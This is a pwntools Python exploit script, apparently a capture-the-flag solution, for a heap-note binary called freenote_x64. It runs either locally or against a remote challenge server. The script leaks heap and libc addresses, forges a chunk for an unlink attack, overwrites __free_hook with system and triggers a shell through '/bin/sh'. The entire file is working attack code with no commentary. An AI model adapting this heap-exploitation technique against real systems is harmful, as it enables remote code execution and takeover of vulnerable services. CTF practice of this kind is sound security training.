from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./freenote_x64")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./freenote_x64")
else:
	p = remote("pwn2.jarvisoj.com",9886)
	libc = ELF("libc-2.19.so")
	elf = ELF("./freenote_x64")

code_base = 0x400000
def debugf():
	gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(0x400998),b2 = hex(0x400F7C)))

def Add(size,content):
	p.sendlineafter("Your choice: ","2")
	p.sendlineafter("Length of new note: ",str(size))
	p.sendafter("Enter your note: ",content)
	p.recvuntil("Done.\n")

def Delete(index):
	p.sendlineafter("Your choice: ","4")
	p.sendlineafter("Note number: ",str(index))
	p.recvuntil("Done.\n")

def Edit(index,size,content):
	p.sendlineafter("Your choice: ","3")
	p.sendlineafter("Note number: ",str(index))
	p.sendlineafter("Length of note: ",str(size))
	p.sendafter("Enter your note: ",content)
	p.recvuntil("Done.\n")

def Show():
	p.sendlineafter("Your choice: ","1")
	return p.recvuntil("== 0ops Free Note ==\n")

def leak_heaplibc():
	Add(0x200,"a"*0x200)
	Add(0x200,"b"*0x200)
	Add(0x200,"c"*0x200)
	Add(0x200,"d"*0x200)
	Delete(0)
	Delete(2)
	Add(0x8,"e"*8)
	Add(0x8,"f"*8)
	info = Show()
	heap_addr = u64(info.split("\n")[0][11:].ljust(8,"\x00"))
	heap_base = heap_addr - (0x604c40 - 0x603000)
	log.success("heap_base:"+hex(heap_base))
	libc_addr = u64(info.split("\n")[2][-6:].ljust(8,"\x00"))
	if debug:
		libc.address = libc_addr - (libc.symbols["__malloc_hook"] + 0x10 + 88)
	else:
		libc.address = libc_addr - (libc.symbols["__malloc_hook"] + 0x10 + 88 + 0x10)
	log.success("libc_base:"+hex(libc.address))
	Delete(0)
	Delete(1)
	Delete(2)
	Delete(3)
	Show()
	return heap_base,libc.address

def unlink(heap_base,libc_base):
	#debugf()
	payload = p64(0x0) + p64(0x201) + p64(heap_base+0x30-0x18) + p64(heap_base + 0x30 - 0x10)
	payload = payload.ljust(0x200,"g")
	payload += p64(0x200) + p64(0x200)
	payload = payload.ljust(0x400,"h")
	Add(0x400,payload)
	Delete(1)
	Show()
	Add(0x1,"j")
	__free_hook = libc.symbols["__free_hook"]
	system_addr = libc.symbols["system"]
	if debug:
		one_gadget = 0x45216
	else:
		one_gadget = 0x46428
	payload = p64(0x10) + p64(1) + p64(0x8) + p64(__free_hook) + p64(1) + p64(0x8) + p64(heap_base + 0x1a40)
	Edit(0,0x400,payload.ljust(0x400,"h"))
	Edit(0,0x8,p64(system_addr))
	Edit(1,0x8,"/bin/sh\x00")
	p.sendlineafter("Your choice: ","4")
	p.sendlineafter("Note number: ",str(1))
	
context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
heap_base,libc_base = leak_heaplibc()
unlink(heap_base,libc_base)
p.interactive()
		
	
